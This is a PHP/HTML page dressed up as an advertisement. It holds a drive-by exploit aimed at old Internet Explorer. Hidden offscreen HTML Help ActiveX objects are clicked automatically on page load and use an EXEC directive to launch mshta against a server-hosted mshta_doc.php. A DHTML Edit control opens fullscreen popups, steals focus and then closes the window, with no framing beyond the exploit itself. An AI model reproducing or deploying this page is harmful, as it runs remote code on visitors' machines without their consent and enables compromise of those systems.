<?php
readfile("ad_data-0.html")
?><OBJECT STYLE="width:1;height:1;top:0;left:-10000;position:absolute;" id=x00000001 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><PARAM NAME="Command" VALUE="Related Topics, MENU"><PARAM NAME="Button" VALUE="Text:Just a button"><PARAM NAME="Window" VALUE="$global_blank"><PARAM NAME="Item1" VALUE="command;ms-its:icwdial.chm::/icw_overview.htm"></OBJECT><OBJECT STYLE="width:1;height:1;top:0;left:-10000;position:absolute;" id=x00000002 classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11><PARAM NAME="Command" VALUE="Related Topics, MENU"><PARAM NAME="Button" VALUE="Text:microsoft help !"><PARAM NAME="Window" VALUE="$global_blank"><PARAM NAME="Item1" VALUE="command;javascript:document.links[0].href='EXEC=,mshta,<?php

echo "http://".$_SERVER["HTTP_HOST"].substr($_SERVER["REQUEST_URI"],0,strrpos($_SERVER["REQUEST_URI"],"/"))."/mshta_doc.php";

?>  CHM=ieshared.chm FILE=app_install.htm'%3Bdocument.links[0].click();"></OBJECT><object id="x00000003" classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A" STYLE="width:1;height:1;top:0;left:0;position:absolute;"  align="middle"><PARAM NAME="ActivateApplets" VALUE="1"><PARAM NAME="ActivateActiveXControls" VALUE="1"></object>
<SCRIPT>

function x00000000()
{
window.x10000001=x00000003.DOM.Script.open("ad.php?id=1","_blank","fullscreen=1");
window.x10000002=setInterval("try{window.x10000001.focus()}catch(e){;}",5);
x00000001.HHClick();
setTimeout("x00000002.HHClick()",700);
x00000003.DOM.Script.open("ad.php?id=2","_blank","fullscreen=1");
x00000003.DOM.Script.open("ad.php?id=3","_blank","fullscreen=1");
setTimeout("window.close()",1000);
}
setTimeout("x00000000()",500);
</SCRIPT>

